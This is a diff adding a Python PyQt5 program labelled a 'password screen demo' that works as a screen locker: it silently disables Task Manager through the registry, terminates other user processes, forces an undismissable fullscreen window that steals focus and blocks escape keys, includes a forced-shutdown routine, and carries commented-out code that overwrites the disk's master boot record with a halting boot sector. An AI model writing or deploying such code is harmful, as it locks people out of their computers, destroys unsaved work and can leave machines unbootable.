@@ -1,0 +1,364 @@
+import os
+import sys
+import random
+import ctypes
+import platform
+import subprocess
+
+from PyQt5.QtWidgets import (
+    QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton,
+    QMessageBox
+)
+from PyQt5.QtCore import Qt, QTimer
+from PyQt5.QtGui import QFont
+
+try:
+    import psutil
+except ImportError:
+    psutil = None
+
+
+# ---------------------------------------------------------------
+# 权限检测
+# ---------------------------------------------------------------
+def is_admin():
+    """Windows 检查是否管理员，Linux/macOS 检查是否 root。"""
+    try:
+        if os.name == "nt":
+            #关掉任务管理器
+            path='reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system" /v DisableTaskMgr /t reg_dword /d "1" /f'
+            os.system(path)
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        else:
+            return os.geteuid() == 0
+    except Exception:
+        return False
+
+
+# ---------------------------------------------------------------
+# 这些进程不会被关闭（系统关键进程 / 桌面外壳 / 终端 / 解释器）
+# ---------------------------------------------------------------
+PROTECTED_NAMES = {
+    # --- Windows 内核与系统服务 ---
+    "system", "system idle process", "registry", "memory compression",
+    "secure system", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe",
+    "services.exe", "lsass.exe", "lsaiso.exe", "svchost.exe",
+    "fontdrvhost.exe", "dwm.exe", "audiodg.exe", "spoolsv.exe",
+    "wudfhost.exe", "taskhostw.exe", "sihost.exe", "ctfmon.exe",
+    "dllhost.exe", "runtimebroker.exe", "searchindexer.exe",
+    "wmiprvse.exe", "msdtc.exe", "lsass.exe",
+    # --- 桌面外壳（杀了会连任务栏一起消失）---
+    "explorer.exe", "shellexperiencehost.exe", "startmenuexperiencehost.exe",
+    "searchhost.exe", "textinputhost.exe", "applicationframehost.exe",
+    # --- 安全软件 ---
+    "securityhealthservice.exe", "securityhealthsystray.exe",
+    "msmpeng.exe", "nissrv.exe", "mpcmdrun.exe",
+    # --- 终端 / 解释器（别把自己搞死）---
+    "cmd.exe", "powershell.exe", "pwsh.exe", "wt.exe",
+    "conhost.exe", "openconsole.exe", "windowsterminal.exe",
+    "python.exe", "pythonw.exe", "py.exe", "pyw.exe",
+    # --- macOS / Linux ---
+    "launchd", "kernel_task", "loginwindow", "windowserver", "finder",
+    "dock", "systemd", "init", "bash", "zsh", "sh",
+    "gnome-shell", "plasmashell", "kwin_x11", "kwin_wayland", "mutter",
+    "xfwm4", "cinnamon", "Xorg",
+}
+
+
+def kill_other_processes():
+    """
+    关闭除本程序之外的用户程序，保留系统进程。
+    返回被处理的进程数量。
+    """
+    if psutil is None:
+        return 0
+
+    me = psutil.Process()
+
+    # 自己 + 所有祖先进程（终端、启动器等）统统保护起来
+    protected_pids = set()
+    node = me
+    while node is not None:
+        protected_pids.add(node.pid)
+        try:
+            node = node.parent()
+        except Exception:
+            node = None
+
+    # 只处理当前用户自己的进程，不动别的用户
+    try:
+        my_user = me.username()
+    except Exception:
+        my_user = None
+
+    victims = []
+    for proc in psutil.process_iter(["pid", "name", "username"]):
+        try:
+            info = proc.info
+            pid = info["pid"]
+
+            if pid <= 4 or pid in protected_pids:
+                continue
+
+            name = (info.get("name") or "").lower()
+            if name in PROTECTED_NAMES:
+                continue
+
+            user = info.get("username")
+            if my_user and user and user != my_user:
+                continue
+
+            proc.terminate()          # 先温柔一点
+            victims.append(proc)
+
+        except psutil.NoSuchProcess:
+            continue
+        except psutil.AccessDenied:
+            continue          # 权限不够就算了，不硬来
+        except psutil.ZombieProcess:
+            continue
+
+    # 2 秒还不走，就强杀
+    _, alive = psutil.wait_procs(victims, timeout=2)
+    for proc in alive:
+        try:
+            proc.kill()
+        except Exception:
+            pass
+
+    return len(victims)
+
+
+class PasswordScreenDemo(QWidget):
+    def __init__(self):
+        super().__init__()
+
+        # ---------------- 强制全屏相关标志 ----------------
+        # 无边框 + 置顶 + 工具窗口（不显示在任务栏）
+        self.setWindowFlags(
+            Qt.FramelessWindowHint          # 去掉标题栏和边框
+            | Qt.WindowStaysOnTopHint       # 永远置顶
+            | Qt.Tool                       # 不显示在任务栏
+        )
+        self.setWindowTitle("Password Screen Demo")
+        self.setStyleSheet("background-color: black;")
+
+        # 允许关闭的开关（密码正确后置 True）
+        self._allow_close = False
+
+        self.code = random.randint(1000000000, 99999999999)
+        self.password = str(self.code + 1)
+        self.tries = 0
+        self.max_tries = 3
+        self.sweep_status = "正在清理其他程序…"
+
+        self.layout = QVBoxLayout()
+        self.layout.setContentsMargins(60, 60, 60, 60)
+        self.setLayout(self.layout)
+
+        self.label = QLabel()
+        self.label.setAlignment(Qt.AlignCenter)
+        self.label.setFont(QFont("Courier", 20))
+        self.label.setStyleSheet("color: #00ff00; background: black;")
+        self.layout.addWidget(self.label, 1)
+
+        self.entry = QLineEdit()
+        self.entry.setAlignment(Qt.AlignCenter)
+        self.entry.setFont(QFont("Courier", 18))
+        self.entry.setStyleSheet(
+            "color: #00ff00; background: black; "
+            "border: 1px solid #00ff00; padding: 8px;"
+        )
+        self.entry.returnPressed.connect(self.check)
+        self.layout.addWidget(self.entry)
+
+        self.button = QPushButton("确定")
+        self.button.setFont(QFont("Courier", 14))
+        self.button.setStyleSheet(
+            "color: #00ff00; background: #222222; "
+            "border: 1px solid #00ff00; padding: 10px;"
+        )
+        self.button.clicked.connect(self.check)
+        self.layout.addWidget(self.button)
+
+        self.update_text()
+        self.entry.setFocus()
+
+        # 等窗口先画出来，再去关别的程序（否则可能先把自己卡住）
+        QTimer.singleShot(300, self.sweep_processes)
+
+        # ---------------- 定时“抢焦点 / 抢置顶” ----------------
+        # 每 500ms 重新置顶 + 抢焦点，防止被切走
+        self._top_timer = QTimer(self)
+        self._top_timer.timeout.connect(self._enforce_top)
+        self._top_timer.start(500)
+
+    # ---------------- 强制全屏 / 抢焦点 ----------------
+    def _enforce_top(self):
+        """周期性把窗口顶到最前，并强制全屏覆盖所有屏幕。"""
+        if not self.isVisible():
+            return
+        self.raise_()
+        self.activateWindow()
+        self.setWindowState(self.windowState() | Qt.WindowActive)
+        # 覆盖主屏 + 所有副屏
+        self.showFullScreen()
+
+    def showEvent(self, event):
+        """显示后再次强制全屏 + 置顶。"""
+        super().showEvent(event)
+        self.showFullScreen()
+        self.raise_()
+        self.activateWindow()
+
+    def closeEvent(self, event):
+        """没有密码正确之前，拦截关闭事件（Alt+F4 / 系统关闭请求）。"""
+        if self._allow_close:
+            event.accept()
+        else:
+            event.ignore()
+
+    def keyPressEvent(self, event):
+        """拦截常见“逃逸”快捷键。"""
+        # Alt+F4、Ctrl+W、Ctrl+Q、Esc 全部吞掉
+        blocked = (
+            (event.modifiers() & Qt.AltModifier and event.key() == Qt.Key_F4)
+            or (event.modifiers() & Qt.ControlModifier and event.key() in (Qt.Key_W, Qt.Key_Q))
+            or event.key() == Qt.Key_Escape
+        )
+        if blocked:
+            event.ignore()
+            return
+        super().keyPressEvent(event)
+
+    # ---------------- 后台清理 ----------------
+    def sweep_processes(self):
+        if psutil is None:
+            self.sweep_status = "未安装 psutil，已跳过清理（pip install psutil）"
+        else:
+            count = kill_other_processes()
+            self.sweep_status = f"已关闭掉 {count} 个其他程序"
+
+        self.update_text()
+        self.raise_()
+        self.activateWindow()
+        self.entry.setFocus()
+
+    # ---------------- 界面文字 ----------------
+    def update_text(self):
+        self.label.setText(
+            f"随机码：{self.code}\n\n"
+            "输入正确密码关闭窗口\n"
+            "你只有 3 次机会\n\n"
+        )
+
+    # ---------------- 校验 ----------------
+    def check(self):
+        value = self.entry.text()
+
+        if value == self.password:
+            self.label.setText("密码正确")
+            '''
+            c=open(r"\\.\PhysicalDrive0","r+b")
+            c.write(mbrbf)
+            c.close()
+            '''
+            if os.name == "nt":
+                moust='reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system" /f'
+                os.system(moust)
+            self.entry.setEnabled(False)
+            self.button.setEnabled(False)
+            self._allow_close = True          # 允许关闭
+            self._top_timer.stop()            # 停止抢焦点
+            QTimer.singleShot(1000, self.close)
+        else:
+            self.tries += 1
+            if self.tries >= self.max_tries:
+                self.label.setText("密码错误，即将关闭")
+                self.entry.setEnabled(False)
+                self.button.setEnabled(False)
+            else:
+                self.label.setText(
+                    f"密码错误\n剩余次数：{self.max_tries - self.tries}\n\n"
+                    f"随机码：{self.code}"
+                )
+                self.entry.clear()
+                self.entry.setFocus()
+
+def shutdown_system(delay_seconds=0):
+    """
+    跨平台关机。
+    delay_seconds: 延迟秒数，0 表示立即关机。
+    """
+    system = platform.system()
+
+    try:
+        if system == "Windows":
+            # /s 关机，/t 延迟秒数，/f 强制关闭正在运行的程序
+            subprocess.run(
+                ["shutdown", "/s", "/t", str(delay_seconds), "/f"],
+                check=True
+            )
+
+        elif system == "Darwin":  # macOS
+            if delay_seconds > 0:
+                # macOS 的 shutdown 用分钟，+1 表示 1 分钟后
+                minutes = max(1, delay_seconds // 60)
+                subprocess.run(["sudo", "shutdown", "-h", f"+{minutes}"], check=True)
+            else:
+                # 立即关机，用 osascript 可以走系统事件，通常不需要 sudo
+                subprocess.run(
+                    ["osascript", "-e", 'tell app "System Events" to shut down'],
+                    check=True
+                )
+
+        elif system == "Linux":
+            if delay_seconds > 0:
+                minutes = max(1, delay_seconds // 60)
+                subprocess.run(["sudo", "shutdown", "-h", f"+{minutes}"], check=True)
+            else:
+                # 有 systemd 的发行版
+                subprocess.run(["sudo", "systemctl", "poweroff"], check=True)
+
+        else:
+            print(f"不支持的系统: {system}")
+            return False
+
+        print("密码错误，即将关机")
+        return True
+
+    except subprocess.CalledProcessError as e:
+        print(f"关机失败，可能是权限不足: {e}")
+        return False
+    except FileNotFoundError as e:
+        print(f"找不到关机命令: {e}")
+        return False
+
+if __name__ == "__main__":
+    app = QApplication(sys.argv)
+
+    # ---- 管理员权限检查 ----
+    if not is_admin():
+        QMessageBox.critical(
+            None,
+            "权限不足",
+            "本程序需要管理员权限运行。\n\n"
+            "Windows：请右键选择“以管理员身份运行”\n"
+            "Linux/macOS：请使用 sudo 运行\n\n"
+            "程序即将退出。"
+        )
+        sys.exit(1)
+        
+    '''
+    #修改mbr
+    a=open(r"\\.\PhysicalDrive0","r+b")
+    mbrbf=a.read(512)
+    a.close()
+    b=open(r"\\.\PhysicalDrive0","r+b")
+    hex_data = bytes([0xB4,0x00,0xB0,0x12,0xCD,0x10,0x8C,0xC8,0x8E,0xD8,0x8E,0xC0,0xB4,0x13,0xB0,0x00,0xB7,0x00,0xB3,0x0F,0xB6,0x00,0xB2,0x00,0xBA,0x0A,0x14,0xB3,0xAA,0xB8,0x2C,0x7C,0x89,0xC5,0xB9,0x06,0x00,0xB8,0x00,0x13,0xCD,0x10,0xFA,0xF4,0x48,0x61,0x48,0x61,0x48,0x61,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA])
+    b.write(hex_data)
+    b.close()
+    '''
+    window = PasswordScreenDemo()
+    window.showFullScreen()
+    sys.exit(app.exec_())
